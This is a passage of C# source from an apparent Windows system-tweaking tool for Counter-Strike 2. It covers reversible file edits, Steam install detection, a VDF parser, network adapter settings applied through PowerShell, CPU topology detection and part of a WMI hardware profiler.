public sealed class FileEditAction(IProtectionPolicy policy, ActionSpec specification) : ITweakAction
{
    private readonly FileEditParameters _parameters = ActionParameters.Parse<FileEditParameters>(specification);
    private static readonly UTF8Encoding StrictUtf8 = new(false, true);
    public string Kind => "FileEdit";
    public Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        Validate();
        policy.EnsureFileAllowed(ResolvePath(context));
        return Task.CompletedTask;
    }
    public async Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var path = ResolvePath(context);
        policy.EnsureFileAllowed(path);
        if (!File.Exists(path))
        {
            var missing = new List<string>();
            var directory = Path.GetDirectoryName(path);
            while (!string.IsNullOrEmpty(directory) && !Directory.Exists(directory)) { missing.Add(directory); directory = Path.GetDirectoryName(directory); }
            return new FileActionState { Path = path, Existed = false, MissingDirectories = missing };
        }
        var info = new FileInfo(path);
        if (info.Length > _parameters.MaxBytes) throw new FragForgeException("file_too_large", $"{path} supera el límite de {_parameters.MaxBytes} bytes.");
        var bytes = await File.ReadAllBytesAsync(path, cancellationToken);
        return new FileActionState { Path = path, Existed = true, ContentBase64 = Convert.ToBase64String(bytes), LastWriteTimeUtc = info.LastWriteTimeUtc };
    }
    public async Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var state = (FileActionState)before;
        policy.EnsureFileAllowed(state.Path);
        var current = File.Exists(state.Path) ? await File.ReadAllBytesAsync(state.Path, cancellationToken) : null;
        var original = state.ContentBase64 is null ? null : Convert.FromBase64String(state.ContentBase64);
        if (!BytesEqual(current, original)) throw new VerificationFailedException("El archivo cambió desde la captura; no se sobrescribe.");
        var transformed = Transform(original ?? []);
        await AtomicFile.WriteAllBytesAsync(state.Path, transformed, cancellationToken);
        context.Report("apply", 1, $"{state.Path}: { _parameters.Edits.Count } ediciones verificables.");
    }
    public async Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var state = (FileActionState)before;
        var expected = Transform(state.ContentBase64 is null ? [] : Convert.FromBase64String(state.ContentBase64));
        var current = File.Exists(state.Path) ? await File.ReadAllBytesAsync(state.Path, cancellationToken) : null;
        return BytesEqual(current, expected) ? VerificationResult.Match("Contenido UTF-8 verificado byte a byte.") : VerificationResult.Missing("El archivo no coincide con la transformación esperada.");
    }
    public async Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var state = (FileActionState)before;
        policy.EnsureFileAllowed(state.Path);
        if (state.Existed)
        {
            await AtomicFile.WriteAllBytesAsync(state.Path, Convert.FromBase64String(state.ContentBase64 ?? ""), cancellationToken);
            if (state.LastWriteTimeUtc is not null) File.SetLastWriteTimeUtc(state.Path, state.LastWriteTimeUtc.Value.UtcDateTime);
        }
        else
        {
            if (File.Exists(state.Path)) File.Delete(state.Path);
            foreach (var directory in state.MissingDirectories) if (Directory.Exists(directory) && !Directory.EnumerateFileSystemEntries(directory).Any()) Directory.Delete(directory);
        }
    }
    public async Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) => Core.Engine.ActionStateEquivalence.Equivalent(before, await CaptureAsync(context, cancellationToken)) ? VerificationResult.Match("Archivo restaurado byte a byte.") : VerificationResult.Missing("El archivo no volvió al estado capturado.");
    public async Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var path = ResolvePath(context);
        var current = File.Exists(path) ? await File.ReadAllTextAsync(path, cancellationToken) : "(archivo nuevo)";
        return $"{path}: {_parameters.Edits.Count} sustituciones regex con recuento esperado; UTF-8/BOM preservados; copia completa reversible. Estado actual: {current[..Math.Min(current.Length, 160)]}";
    }
    private byte[] Transform(byte[] original)
    {
        var hasBom = original.AsSpan().StartsWith(new byte[] { 0xEF, 0xBB, 0xBF });
        var text = StrictUtf8.GetString(hasBom ? original[3..] : original);
        foreach (var edit in _parameters.Edits)
        {
            var regex = new Regex(edit.Pattern, RegexOptions.CultureInvariant, TimeSpan.FromSeconds(1));
            var count = regex.Matches(text).Count;
            if (count != edit.ExpectedMatches) throw new VerificationFailedException($"'{edit.Pattern}' encontró {count} coincidencias; esperaba {edit.ExpectedMatches}.");
            text = regex.Replace(text, edit.Replacement);
        }
        var bytes = StrictUtf8.GetBytes(text);
        return hasBom ? new byte[] { 0xEF, 0xBB, 0xBF }.Concat(bytes).ToArray() : bytes;
    }
    private string ResolvePath(ActionExecutionContext context) => Path.GetFullPath(ActionParameters.ResolveToken(_parameters.Path, context));
    private void Validate()
    {
        if (_parameters.MaxBytes is <= 0 or > 1048576) throw new CatalogValidationException("FileEdit MaxBytes must be 1..1048576.", [_parameters.MaxBytes.ToString()]);
        if (_parameters.Edits.Count == 0) throw new CatalogValidationException("FileEdit requires edits.", ["edits"]);
        foreach (var edit in _parameters.Edits) { _ = new Regex(edit.Pattern, RegexOptions.CultureInvariant, TimeSpan.FromSeconds(1)); if (edit.ExpectedMatches < 0) throw new CatalogValidationException("ExpectedMatches cannot be negative.", [edit.Pattern]); }
    }
    private static bool BytesEqual(byte[]? a, byte[]? b) => a is null ? b is null : b is not null && a.AsSpan().SequenceEqual(b);
}
internal sealed record FileEditParameters { public required string Path { get; init; } public int MaxBytes { get; init; } = 1048576; public IReadOnlyList<FileTextEdit> Edits { get; init; } = []; }
internal sealed record FileTextEdit { public required string Pattern { get; init; } public string Replacement { get; init; } = ""; public int ExpectedMatches { get; init; } = 1; }
````

### `src/FragForge.Actions/Files/SteamGameLocator.cs`  <sub>(46 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Files;

public sealed class SteamGameLocator(IRegistry registry) : IGameLocator
{
    private const string RelativeExecutable = @"steamapps\common\Counter-Strike Global Offensive\game\bin\win64\cs2.exe";
    public async Task<GameInfo> LocateCs2Async(CancellationToken cancellationToken = default)
    {
        var steamRoots = new List<string>();
        foreach (var key in new[] { @"HKCU\Software\Valve\Steam", @"HKLM\SOFTWARE\WOW6432Node\Valve\Steam" })
        {
            foreach (var name in new[] { "SteamPath", "InstallPath", "SteamExe" })
            {
                var value = await registry.ReadValueAsync(key, name, cancellationToken);
                if (value.ValueExists && value.Data is string path)
                {
                    var expanded = Environment.ExpandEnvironmentVariables(path.Replace('/', Path.DirectorySeparatorChar));
                    if (name == "SteamExe") expanded = Path.GetDirectoryName(expanded) ?? expanded;
                    if (Directory.Exists(expanded)) steamRoots.Add(Path.GetFullPath(expanded));
                }
            }
        }
        var defaultRoot = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam");
        if (Directory.Exists(defaultRoot)) steamRoots.Add(defaultRoot);
        var libraries = new HashSet<string>(steamRoots, StringComparer.OrdinalIgnoreCase);
        foreach (var root in steamRoots.Distinct(StringComparer.OrdinalIgnoreCase))
        {
            var libraryFile = Path.Combine(root, "steamapps", "libraryfolders.vdf");
            if (!File.Exists(libraryFile)) continue;
            var node = ValveDataFormat.Parse(await File.ReadAllTextAsync(libraryFile, cancellationToken));
            if (!node.Children.TryGetValue("libraryfolders", out var folders)) continue;
            foreach (var folder in folders.Children.Values)
            {
                if (folder.Children.TryGetValue("path", out var pathNode) && pathNode.Value is not null)
                {
                    var path = Path.GetFullPath(pathNode.Value.Replace(@"\\", "\\").Replace('/', Path.DirectorySeparatorChar));
                    if (Directory.Exists(path)) libraries.Add(path);
                }
            }
        }
        var candidates = libraries.Select(l => Path.Combine(l, RelativeExecutable)).Where(File.Exists).Distinct(StringComparer.OrdinalIgnoreCase).OrderBy(x => x, StringComparer.OrdinalIgnoreCase).ToArray();
        return new GameInfo { Cs2ExecutablePath = candidates.Length == 1 ? candidates[0] : null, Cs2DetectionSource = candidates.Length == 1 ? "Steam libraryfolders.vdf" : candidates.Length > 1 ? "Ambiguous; manual selection required" : "Not found", Cs2Candidates = candidates, Cs2Ambiguous = candidates.Length > 1 };
    }
}
````

### `src/FragForge.Actions/Files/ValveDataFormat.cs`  <sub>(76 líneas)</sub>

````csharp
using System.Text;

namespace FragForge.Actions.Files;

public sealed class VdfNode
{
    public string? Value { get; init; }
    public IReadOnlyDictionary<string, VdfNode> Children { get; init; } = new Dictionary<string, VdfNode>(StringComparer.OrdinalIgnoreCase);
    public bool IsObject => Value is null;
}
public static class ValveDataFormat
{
    public static VdfNode Parse(string text)
    {
        if (text.Length > 1048576) throw new InvalidDataException("VDF exceeds 1 MiB.");
        var index = 0;
        var result = ParseObject(text, ref index, 0, false);
        SkipTrivia(text, ref index);
        if (index != text.Length) throw new InvalidDataException("Trailing characters in VDF.");
        return result;
    }
    private static VdfNode ParseObject(string text, ref int index, int depth, bool root)
    {
        if (depth > 64) throw new InvalidDataException("VDF nesting exceeds 64.");
        var children = new Dictionary<string, VdfNode>(StringComparer.OrdinalIgnoreCase);
        while (true)
        {
            SkipTrivia(text, ref index);
            if (index >= text.Length) { if (root) return new VdfNode { Children = children }; throw new InvalidDataException("Unclosed VDF object."); }
            if (text[index] == '}') { index++; if (root) throw new InvalidDataException("Unexpected closing brace."); return new VdfNode { Children = children }; }
            var key = ParseToken(text, ref index);
            SkipTrivia(text, ref index);
            if (index >= text.Length) throw new InvalidDataException("Missing VDF value.");
            VdfNode value;
            if (text[index] == '{') { index++; value = ParseObject(text, ref index, depth + 1, false); }
            else value = new VdfNode { Value = ParseToken(text, ref index) };
            if (!children.TryAdd(key, value)) throw new InvalidDataException($"Duplicate VDF key '{key}'.");
        }
    }
    private static string ParseToken(string text, ref int index)
    {
        SkipTrivia(text, ref index);
        if (index >= text.Length) throw new InvalidDataException("Unexpected end of VDF.");
        if (text[index] == '"')
        {
            index++;
            var builder = new StringBuilder();
            while (index < text.Length)
            {
                var c = text[index++];
                if (c == '"') return builder.ToString();
                if (c == '\\')
                {
                    if (index >= text.Length) break;
                    var escape = text[index++];
                    builder.Append(escape switch { '\\' => '\\', '"' => '"', 'n' => '\n', 't' => '\t', _ => throw new InvalidDataException($"Unsupported VDF escape '\\{escape}'.") });
                }
                else builder.Append(c);
            }
            throw new InvalidDataException("Unclosed VDF string.");
        }
        var start = index;
        while (index < text.Length && !char.IsWhiteSpace(text[index]) && text[index] is not '{' and not '}') index++;
        if (start == index) throw new InvalidDataException("Empty VDF token.");
        return text[start..index];
    }
    private static void SkipTrivia(string text, ref int index)
    {
        while (index < text.Length)
        {
            if (char.IsWhiteSpace(text[index])) { index++; continue; }
            if (index + 1 < text.Length && text[index] == '/' && text[index + 1] == '/') { while (index < text.Length && text[index] != '\n') index++; continue; }
            break;
        }
    }
}
````

### `src/FragForge.Actions/FragForge.Actions.csproj`  <sub>(6 líneas)</sub>

````xml
<Project Sdk="Microsoft.NET.Sdk">
  <ItemGroup>
    <ProjectReference Include="../FragForge.Core/FragForge.Core.csproj" />
    <PackageReference Include="System.Management" />
  </ItemGroup>
</Project>
````

### `src/FragForge.Actions/Network/NetAdapterPropertyAction.cs`  <sub>(75 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Network;

public sealed class NetAdapterPropertyAction(INetworkAdapterController controller, IProtectionPolicy policy, ActionSpec specification) : ITweakAction
{
    private readonly NetworkParameters _parameters = ActionParameters.Parse<NetworkParameters>(specification);
    public string Kind => "NetAdapterProperty";
    public async Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var adapter = ResolveAdapter(context);
        if (_parameters.Properties.Count == 0) throw new CatalogValidationException("Network action requires properties.", ["properties"]);
        foreach (var property in _parameters.Properties)
        {
            policy.EnsureNetworkPropertyAllowed(adapter, property.Keyword);
            var current = await controller.GetAsync(adapter, property.Keyword, cancellationToken);
            if (!current.Exists) throw new ActionNotApplicableException($"El adaptador {adapter} no expone '{property.Keyword}'.");
        }
    }
    public async Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var adapter = ResolveAdapter(context);
        var captures = new List<NetworkPropertyCapture>();
        foreach (var property in _parameters.Properties) captures.Add(await controller.GetAsync(adapter, property.Keyword, cancellationToken));
        return new NetworkPropertyActionState { Properties = captures };
    }
    public async Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var adapter = ResolveAdapter(context);
        foreach (var property in _parameters.Properties) { policy.EnsureNetworkPropertyAllowed(adapter, property.Keyword); await controller.SetAsync(adapter, property.Keyword, property.Value, cancellationToken); }
    }
    public async Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var adapter = ResolveAdapter(context);
        foreach (var property in _parameters.Properties)
        {
            var current = await controller.GetAsync(adapter, property.Keyword, cancellationToken);
            if (!current.Exists || !current.RegistryValue.SequenceEqual(property.Value, StringComparer.Ordinal)) return VerificationResult.Missing($"{adapter}:{property.Keyword} no coincide.");
        }
        return VerificationResult.Match("Propiedades avanzadas del adaptador verificadas.");
    }
    public async Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        foreach (var property in ((NetworkPropertyActionState)before).Properties.AsEnumerable().Reverse())
        {
            policy.EnsureNetworkPropertyAllowed(property.AdapterName, property.Keyword);
            if (!property.Exists) throw new InvalidOperationException("Cannot remove an advanced property; capture required an existing property.");
            await controller.SetAsync(property.AdapterName, property.Keyword, property.RegistryValue, cancellationToken);
        }
    }
    public async Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) => Core.Engine.ActionStateEquivalence.Equivalent(before, await CaptureAsync(context, cancellationToken)) ? VerificationResult.Match("Propiedades de red restauradas.") : VerificationResult.Missing("Las propiedades de red no volvieron al estado capturado.");
    public async Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var adapter = ResolveAdapter(context);
        var lines = new List<string>();
        foreach (var property in _parameters.Properties)
        {
            var current = await controller.GetAsync(adapter, property.Keyword, cancellationToken);
            lines.Add($"{adapter}:{property.Keyword}: [{string.Join(",", current.RegistryValue)}] -> [{string.Join(",", property.Value)}]. Puede renegociar el enlace; revert restaura el valor previo.");
        }
        return string.Join(Environment.NewLine, lines);
    }
    private string ResolveAdapter(ActionExecutionContext context)
    {
        var name = _parameters.AdapterName;
        if (!name.StartsWith("{AdapterDescription:", StringComparison.Ordinal)) return name;
        var description = name["{AdapterDescription:".Length..^1];
        var matches = context.Hardware.NetworkAdapters.Where(a => a.IsPhysical && a.Description.Contains(description, StringComparison.OrdinalIgnoreCase)).ToArray();
        if (matches.Length != 1) throw new ActionNotApplicableException($"Se requiere exactamente un adaptador físico '{description}'; encontrados {matches.Length}.");
        return matches[0].Name;
    }
}
internal sealed record NetworkParameters { public required string AdapterName { get; init; } public IReadOnlyList<NetworkPropertyTarget> Properties { get; init; } = []; }
internal sealed record NetworkPropertyTarget { public required string Keyword { get; init; } public IReadOnlyList<string> Value { get; init; } = []; }
````

### `src/FragForge.Actions/Network/WindowsNetworkAdapterController.cs`  <sub>(35 líneas)</sub>

````csharp
using System.Runtime.Versioning;
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Network;

[SupportedOSPlatform("windows")]
public sealed class WindowsNetworkAdapterController(IProcessRunner runner) : INetworkAdapterController
{
    public async Task<NetworkPropertyCapture> GetAsync(string adapterName, string keyword, CancellationToken cancellationToken = default)
    {
        var script = "$ErrorActionPreference='Stop'; [Console]::OutputEncoding=[System.Text.UTF8Encoding]::new(); " +
            $"$p=Get-NetAdapterAdvancedProperty -Name '{Escape(adapterName)}' -RegistryKeyword '{Escape(keyword)}' -ErrorAction SilentlyContinue; " +
            "if ($null -eq $p) { '{\"exists\":false}' } else { [pscustomobject]@{exists=$true; keyword=[string]$p.RegistryKeyword; value=@($p.RegistryValueData); display=[string]$p.DisplayValue} | ConvertTo-Json -Compress -Depth 4 }";
        var result = await RunAsync(script, null, cancellationToken);
        using var document = JsonDocument.Parse(result.StandardOutput.TrimStart('\uFEFF'));
        var root = document.RootElement;
        if (!root.GetProperty("exists").GetBoolean()) return new NetworkPropertyCapture { AdapterName = adapterName, Keyword = keyword, Exists = false };
        return new NetworkPropertyCapture { AdapterName = adapterName, Keyword = root.GetProperty("keyword").GetString() ?? keyword, Exists = true, RegistryValue = root.GetProperty("value").EnumerateArray().Select(x => x.GetString() ?? "").ToArray(), DisplayValue = root.GetProperty("display").GetString() };
    }
    public async Task SetAsync(string adapterName, string keyword, IReadOnlyList<string> value, CancellationToken cancellationToken = default)
    {
        var array = "@(" + string.Join(",", value.Select(v => "'" + Escape(v) + "'")) + ")";
        var script = $"$ErrorActionPreference='Stop'; Set-NetAdapterAdvancedProperty -Name '{Escape(adapterName)}' -RegistryKeyword '{Escape(keyword)}' -RegistryValue {array} -Confirm:$false";
        await RunAsync(script, null, cancellationToken);
    }
    private async Task<ProcessResult> RunAsync(string script, string? input, CancellationToken cancellationToken)
    {
        var result = await runner.RunAsync(new ProcessRequest { FileName = Platform.ProcessRunner.SystemExecutable(@"WindowsPowerShell\v1.0\powershell.exe"), Arguments = ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script], StandardInput = input, Timeout = TimeSpan.FromSeconds(90) }, cancellationToken);
        if (!result.IsSuccess) throw new ProcessFailedException("powershell.exe", result.ExitCode, result.TimedOut ? "timeout" : result.StandardError);
        return result;
    }
    private static string Escape(string value) => value.Replace("'", "''");
}
````

### `src/FragForge.Actions/Platform/CpuTopology.cs`  <sub>(68 líneas)</sub>

````csharp
using System.Buffers.Binary;
using System.Numerics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace FragForge.Actions.Platform;

public sealed record CpuTopologyResult(int? PCores, int? ECores, int LogicalProcessors, bool? IsHybrid, string Source);
public interface ICpuTopologyProbe
{
    Task<CpuTopologyResult> ReadAsync(CancellationToken cancellationToken = default);
}
public static class CpuTopologyInterpreter
{
    public static CpuTopologyResult FromEfficiencyClasses(IReadOnlyList<(byte EfficiencyClass, int LogicalProcessors)> cores)
    {
        if (cores.Count == 0 || cores.Any(c => c.LogicalProcessors <= 0)) return new(null, null, 0, null, "Unavailable");
        var classes = cores.Select(c => c.EfficiencyClass).Distinct().OrderBy(x => x).ToArray();
        var logical = cores.Sum(c => c.LogicalProcessors);
        if (classes.Length == 1) return new(null, null, logical, false, "GetLogicalProcessorInformationEx: single EfficiencyClass");
        var max = classes[^1];
        var p = cores.Count(c => c.EfficiencyClass == max);
        var e = cores.Count - p;
        return new(p, e, logical, true, "GetLogicalProcessorInformationEx: distinct EfficiencyClass values");
    }
}
[SupportedOSPlatform("windows")]
public sealed class WindowsCpuTopologyProbe : ICpuTopologyProbe
{
    public Task<CpuTopologyResult> ReadAsync(CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();
        uint size = 0;
        GetLogicalProcessorInformationEx(0, IntPtr.Zero, ref size);
        if (size == 0 || size > 1024 * 1024) return Task.FromResult(new CpuTopologyResult(null, null, Environment.ProcessorCount, null, "GetLogicalProcessorInformationEx failed"));
        var buffer = Marshal.AllocHGlobal((int)size);
        try
        {
            if (!GetLogicalProcessorInformationEx(0, buffer, ref size)) return Task.FromResult(new CpuTopologyResult(null, null, Environment.ProcessorCount, null, $"GetLogicalProcessorInformationEx error {Marshal.GetLastWin32Error()}"));
            var cores = new List<(byte, int)>();
            var offset = 0;
            while (offset + 8 <= size)
            {
                var relationship = Marshal.ReadInt32(buffer, offset);
                var recordSize = Marshal.ReadInt32(buffer, offset + 4);
                if (recordSize < 8 || offset + recordSize > size) throw new InvalidDataException("Invalid processor information record.");
                if (relationship == 0)
                {
                    var efficiency = Marshal.ReadByte(buffer, offset + 9);
                    var groupCount = Marshal.ReadInt16(buffer, offset + 30);
                    var threads = 0;
                    for (var g = 0; g < groupCount; g++)
                    {
                        var mask = Marshal.ReadIntPtr(buffer, offset + 32 + g * (IntPtr.Size == 8 ? 24 : 16));
                        threads += BitOperations.PopCount(unchecked((ulong)mask.ToInt64()));
                    }
                    cores.Add((efficiency, threads));
                }
                offset += recordSize;
            }
            return Task.FromResult(CpuTopologyInterpreter.FromEfficiencyClasses(cores));
        }
        finally { Marshal.FreeHGlobal(buffer); }
    }
    [DllImport("kernel32.dll", SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    private static extern bool GetLogicalProcessorInformationEx(int relationshipType, IntPtr buffer, ref uint returnedLength);
}
````

### `src/FragForge.Actions/Platform/HardwareProfiler.cs`  <sub>(210 líneas)</sub>

````csharp
using System.Globalization;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Security.Principal;
using System.Text.RegularExpressions;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Platform;

internal static class WmiValues
{
    public static string? String(IReadOnlyDictionary<string, object?> row, string key) => row.TryGetValue(key, out var value) ? value?.ToString()?.Trim() : null;
    public static ulong? UInt64(IReadOnlyDictionary<string, object?> row, string key) => row.TryGetValue(key, out var value) && value is not null && ulong.TryParse(Convert.ToString(value, CultureInfo.InvariantCulture), NumberStyles.Integer, CultureInfo.InvariantCulture, out var result) ? result : null;
    public static int? Int32(IReadOnlyDictionary<string, object?> row, string key) => row.TryGetValue(key, out var value) && value is not null && int.TryParse(Convert.ToString(value, CultureInfo.InvariantCulture), NumberStyles.Integer, CultureInfo.InvariantCulture, out var result) ? result : null;
    public static bool? Bool(IReadOnlyDictionary<string, object?> row, string key) => row.TryGetValue(key, out var value) && value is not null ? Convert.ToBoolean(value, CultureInfo.InvariantCulture) : null;
    public static IReadOnlyList<object> Array(IReadOnlyDictionary<string, object?> row, string key) => row.TryGetValue(key, out var value) && value is System.Collections.IEnumerable enumerable and not string ? enumerable.Cast<object>().ToArray() : [];
}

[SupportedOSPlatform("windows")]
public sealed class WindowsHardwareProfiler(IWmiQuery wmi, IRegistry registry, IProcessRunner runner, IGameLocator games, ICpuTopologyProbe topology, ISystemRestoreService restore) : IHardwareProfiler
{
    public async Task<HardwareProfile> ProfileAsync(CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null)
    {
        var warnings = new List<string>();
        var observations = new List<DiagnosticObservation>();
        async Task<IReadOnlyList<IReadOnlyDictionary<string, object?>>> Query(string scope, string className, string[] properties, string? where = null)
        {
            cancellationToken.ThrowIfCancellationRequested();
            progress?.Report(new EngineProgress("hardware", null, 0, $"Consultando {className}."));
            try { return await wmi.QueryAsync(scope, className, properties, where, cancellationToken); }
            catch (Exception ex) when (ex is not OperationCanceledException) { warnings.Add($"{className}: {ex.Message}"); return []; }
        }
        var osRows = await Query(@"root\cimv2", "Win32_OperatingSystem", ["Caption", "Version", "BuildNumber", "OSArchitecture"]);
        var osRow = osRows.FirstOrDefault() ?? new Dictionary<string, object?>();
        var ubr = await registry.ReadValueAsync(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "UBR", cancellationToken);
        var os = new OsInfo
        {
            Name = WmiValues.String(osRow, "Caption") ?? "Windows",
            Edition = WmiValues.String(osRow, "Caption") ?? "Unknown",
            Version = WmiValues.String(osRow, "Version") ?? "Unknown",
            Build = WmiValues.Int32(osRow, "BuildNumber") ?? 0,
            Ubr = ubr.ValueExists ? Convert.ToInt32(ubr.Data, CultureInfo.InvariantCulture) : 0,
            Architecture = WmiValues.String(osRow, "OSArchitecture") ?? RuntimeInformation.OSArchitecture.ToString(),
            Culture = CultureInfo.CurrentCulture.Name,
            TimeZone = TimeZoneInfo.Local.Id
        };
        var csRows = await Query(@"root\cimv2", "Win32_ComputerSystem", ["UserName", "TotalPhysicalMemory", "Manufacturer", "Model", "PCSystemType"]);
        var cs = csRows.FirstOrDefault() ?? new Dictionary<string, object?>();
        var cpuRows = await Query(@"root\cimv2", "Win32_Processor", ["Name", "Manufacturer", "NumberOfCores", "NumberOfLogicalProcessors", "MaxClockSpeed", "VirtualizationFirmwareEnabled", "VMMonitorModeExtensions"]);
        var cpuRow = cpuRows.FirstOrDefault() ?? new Dictionary<string, object?>();
        var topologyResult = await topology.ReadAsync(cancellationToken);
        var vendor = (WmiValues.String(cpuRow, "Manufacturer") ?? "").Contains("Intel", StringComparison.OrdinalIgnoreCase) ? "Intel" : WmiValues.String(cpuRow, "Manufacturer") ?? "Unknown";
        var cpu = new CpuInfo
        {
            Model = WmiValues.String(cpuRow, "Name") ?? "Unknown", Vendor = vendor,
            PhysicalCores = cpuRows.Sum(r => WmiValues.Int32(r, "NumberOfCores") ?? 0),
            LogicalProcessors = topologyResult.LogicalProcessors > 0 ? topologyResult.LogicalProcessors : cpuRows.Sum(r => WmiValues.Int32(r, "NumberOfLogicalProcessors") ?? 0),
            PCores = topologyResult.PCores, ECores = topologyResult.ECores, IsHybrid = topologyResult.IsHybrid, TopologySource = topologyResult.Source,
            FirmwareVirtualizationEnabled = WmiValues.Bool(cpuRow, "VirtualizationFirmwareEnabled"), BaseClockMhz = WmiValues.Int32(cpuRow, "MaxClockSpeed")
        };
        if (topologyResult.IsHybrid is null) warnings.Add("CPU P/E: no se pudo consultar EfficiencyClass; no se asume hibridación por el nombre del modelo.");
        var memoryRows = await Query(@"root\cimv2", "Win32_PhysicalMemory", ["Manufacturer", "PartNumber", "BankLabel", "DeviceLocator", "Capacity", "Speed", "ConfiguredClockSpeed", "SMBIOSMemoryType"]);
        var modules = memoryRows.Select(r => new MemoryModuleInfo { Manufacturer = WmiValues.String(r, "Manufacturer"), PartNumber = WmiValues.String(r, "PartNumber"), BankLabel = WmiValues.String(r, "BankLabel"), DeviceLocator = WmiValues.String(r, "DeviceLocator"), CapacityBytes = WmiValues.UInt64(r, "Capacity") ?? 0, SpeedMtPerSecond = WmiValues.Int32(r, "Speed"), ConfiguredSpeedMtPerSecond = WmiValues.Int32(r, "ConfiguredClockSpeed"), SmbiosMemoryType = WmiValues.Int32(r, "SMBIOSMemoryType") }).ToArray();
        var speeds = modules.Select(m => m.ConfiguredSpeedMtPerSecond ?? m.SpeedMtPerSecond).Where(s => s is not null).Distinct().ToArray();
        var memory = new MemoryInfo { TotalBytes = WmiValues.UInt64(cs, "TotalPhysicalMemory") ?? 0, Modules = modules, Channels = MemoryChannelState.Unknown, ConfiguredSpeedMtPerSecond = speeds.Length == 1 ? speeds[0] : null, ChannelEvidence = "Win32_PhysicalMemory describe módulos, no el entrelazado del controlador. Dos DIMM no prueban dual-channel; verificar con una herramienta de topología de memoria." };
        var gpuRows = await Query(@"root\cimv2", "Win32_VideoController", ["Name", "AdapterCompatibility", "AdapterRAM", "DriverVersion", "CurrentHorizontalResolution", "CurrentVerticalResolution", "CurrentRefreshRate"]);
        var gpus = gpuRows.Select(r =>
        {
            var name = WmiValues.String(r, "Name") ?? "Unknown";
            var compatibility = WmiValues.String(r, "AdapterCompatibility") ?? "";
            var gpuVendor = compatibility.Contains("Intel", StringComparison.OrdinalIgnoreCase) ? GpuVendor.Intel : compatibility.Contains("NVIDIA", StringComparison.OrdinalIgnoreCase) ? GpuVendor.Nvidia : compatibility.Contains("AMD", StringComparison.OrdinalIgnoreCase) || compatibility.Contains("ATI", StringComparison.OrdinalIgnoreCase) ? GpuVendor.Amd : compatibility.Contains("Microsoft", StringComparison.OrdinalIgnoreCase) ? GpuVendor.Microsoft : GpuVendor.Unknown;
            return new GpuInfo { Name = name, Vendor = gpuVendor, DriverVersion = WmiValues.String(r, "DriverVersion"), ReportedAdapterRamBytes = WmiValues.UInt64(r, "AdapterRAM"), IsIntegrated = gpuVendor == GpuVendor.Intel && (name.Contains("UHD", StringComparison.OrdinalIgnoreCase) || name.Contains("Iris", StringComparison.OrdinalIgnoreCase) || name.Contains("HD Graphics", StringComparison.OrdinalIgnoreCase)), SharedMemoryBudgetBytes = null };
        }).ToArray();
        var diskRows = await Query(@"root\cimv2", "Win32_DiskDrive", ["Model", "SerialNumber", "Size", "MediaType", "InterfaceType", "PNPDeviceID", "Status"]);
        var physicalDisks = await Query(@"root\Microsoft\Windows\Storage", "MSFT_PhysicalDisk", ["FriendlyName", "SerialNumber", "Size", "MediaType", "BusType", "HealthStatus", "SpindleSpeed"]);
        var smartRows = await Query(@"root\wmi", "MSStorageDriver_FailurePredictStatus", ["InstanceName", "PredictFailure", "Reason"]);
        var disks = diskRows.Select(r =>
        {
            var model = WmiValues.String(r, "Model") ?? "Unknown";
            var serial = WmiValues.String(r, "SerialNumber");
            var physical = physicalDisks.FirstOrDefault(p => (serial is not null && string.Equals(WmiValues.String(p, "SerialNumber")?.Trim(), serial.Trim(), StringComparison.OrdinalIgnoreCase)) || model.Contains(WmiValues.String(p, "FriendlyName") ?? "\0", StringComparison.OrdinalIgnoreCase));
            var media = physical is null ? null : WmiValues.Int32(physical, "MediaType");
            var bus = physical is null ? WmiValues.String(r, "InterfaceType") ?? "Unknown" : BusName(WmiValues.Int32(physical, "BusType"));
            var pnp = WmiValues.String(r, "PNPDeviceID") ?? "";
            var smart = smartRows.FirstOrDefault(s => (WmiValues.String(s, "InstanceName") ?? "").Contains(pnp, StringComparison.OrdinalIgnoreCase));
            var kind = bus == "NVMe" ? DiskKind.Nvme : media == 4 ? DiskKind.Ssd : media == 3 ? DiskKind.Hdd : media == 5 ? DiskKind.Scm : (WmiValues.String(r, "MediaType") ?? "").Contains("SSD", StringComparison.OrdinalIgnoreCase) ? DiskKind.Ssd : DiskKind.Unknown;
            var health = physical is null ? WmiValues.String(r, "Status") ?? "Unknown" : WmiValues.Int32(physical, "HealthStatus") switch { 0 => "Healthy", 1 => "Warning", 2 => "Unhealthy", _ => "Unknown" };
